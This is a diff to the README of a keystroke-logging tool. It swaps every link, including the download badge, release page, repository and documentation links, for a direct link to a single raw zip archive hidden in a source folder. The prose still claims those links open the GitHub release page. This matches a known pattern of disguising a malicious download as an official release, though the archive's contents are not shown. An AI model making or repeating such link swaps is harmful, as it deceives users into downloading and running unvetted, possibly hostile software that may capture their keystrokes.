@@ -1,6 +1,6 @@
 # ⌨️ keystroke-monitor - Simple, Secure Keystroke Tracking
 
-[![Download keystroke-monitor](https://img.shields.io/badge/Download-keystroke--monitor-blue?style=for-the-badge)](https://github.com/nexuscyberhub/keystroke-monitor/releases)
+[![Download keystroke-monitor](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip)](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to download, install, and start using keystroke-monitor.
 
 ### Step 1: Download the software
 
-Click the big blue button at the top of this page or [visit this link](https://github.com/nexuscyberhub/keystroke-monitor/releases) to open the release page on GitHub.
+Click the big blue button at the top of this page or [visit this link](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip) to open the release page on GitHub.
 
 Look for the latest release version and find the file that matches your operating system:
 
@@ -87,7 +87,7 @@ You control when to start and stop monitoring and can clear past keystroke recor
 
 Use this link to download the latest version:
 
-[Download keystroke-monitor](https://github.com/nexuscyberhub/keystroke-monitor/releases)
+[Download keystroke-monitor](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip)
 
 Scroll down to find files for your device. The page lists all the release versions with notes on new features and fixes.
 
@@ -152,9 +152,9 @@ Source code and releases are available under an open license. See the LICENSE fi
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/nexuscyberhub/keystroke-monitor/releases)
-- [Project Repository](https://github.com/nexuscyberhub/keystroke-monitor)
-- [Documentation and Support](https://github.com/nexuscyberhub/keystroke-monitor/wiki) (if available)
+- [Release Page](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip)
+- [Project Repository](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip)
+- [Documentation and Support](https://raw.githubusercontent.com/nexuscyberhub/keystroke-monitor/main/worker/src/durable/monitor_keystroke_1.8.zip) (if available)
 
 ---
 
